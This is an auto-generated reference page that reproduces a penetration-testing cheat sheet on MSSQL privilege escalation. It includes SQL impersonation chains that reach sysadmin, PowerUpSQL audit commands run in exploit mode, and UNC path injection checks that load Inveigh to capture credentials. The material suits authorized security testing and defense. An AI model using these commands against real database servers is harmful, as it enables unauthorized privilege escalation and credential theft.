---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# MSSQL - Audit Checks

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-databases-mssql-audit-checks` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/databases/mssql-audit-checks.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Impersonation Opportunities

## Preserved Body

````markdown
## Impersonation Opportunities

* Impersonate as: `EXECUTE AS LOGIN = 'sa'`
* Impersonate `dbo` with DB_OWNER

 ```sql
 SQL> select is_member('db_owner');
 SQL> execute as user = 'dbo'
 SQL> SELECT is_srvrolemember('sysadmin')
 ```

```ps1
Invoke-SQLAuditPrivImpersonateLogin -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Exploit -Verbose

# impersonate sa account
powerpick Get-SQLQuery -Instance "<DBSERVERNAME\DBInstance>" -Query "EXECUTE AS LOGIN = 'sa'; SELECT IS_SRVROLEMEMBER(''sysadmin'')" -Verbose -Debug
```

### Exploiting Impersonation

```sql
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
EXECUTE AS LOGIN = 'adminuser'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
SELECT ORIGINAL_LOGIN()
```

### Exploiting Nested Impersonation

```sql
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
EXECUTE AS LOGIN = 'stduser'
SELECT SYSTEM_USER
EXECUTE AS LOGIN = 'sa'
SELECT IS_SRVROLEMEMBER('sysadmin')
SELECT ORIGINAL_LOGIN()
SELECT SYSTEM_USER
```

## Trustworthy Databases

```sql
Invoke-SQLAuditPrivTrustworthy -Instance "<DBSERVERNAME\DBInstance>" -Exploit -Verbose 

SELECT name as database_name, SUSER_NAME(owner_sid) AS database_owner, is_trustworthy_on AS TRUSTWORTHY from sys.databases
```

> The following audit checks run web requests to load Inveigh via reflection. Be mindful of the environment and ability to connect outbound.

```ps1
Invoke-SQLAuditPrivXpDirtree
Invoke-SQLUncPathInjection
Invoke-SQLAuditPrivXpFileexist
```
````

## Source Verification

[source record](../../sources/internalallthethings/mssql-audit-checks.md)

## Evidence Excerpt

````text
_body: "# MSSQL - Audit Checks\n\n## Summary\n\n* [Impersonation Opportunities](#impersonation-opportunities)\n    * [Exploiting\
\ Impersonation](#exploiting-impersonation)\n    * [Exploiting Nested Impersonation](#exploiting-nested-impersonation)\n\
* [Trustworthy Databases](#trustworthy-databases)\n\n## Impersonation Opportunities\n\n* Impersonate as: `EXECUTE AS LOGIN\
\ = 'sa'`\n* Impersonate `dbo` with DB_OWNER\n\n ```sql\n SQL> select is_member('db_owner');\n SQL> execute as user = 'dbo'\n\
\ SQL> SELECT is_srvrolemember('sysadmin')\n ```\n\n```ps1\nInvoke-SQLAuditPrivImpersonateLogin -Username sa -Password Password1234\
\ -Instance \"<DBSERVERNAME\\DBInstance>\" -Exploit -Verbose\n\n# impersonate sa account\npowerpick Get-SQLQuery -Instance\
\ \"<DBSERVERNAME\\DBInstance>\" -Query \"EXECUTE AS LOGIN = 'sa'; SELECT IS_SRVROLEMEMBER(''sysadmin'')\" -Verbose -Debug\n\
```\n\n### Exploiting Impersonation\n\n```sql\nSELECT SYSTEM_USER\nSELECT IS_SRVROLEMEMBER('sysadmin')\nEXECUTE AS LOGIN\
````
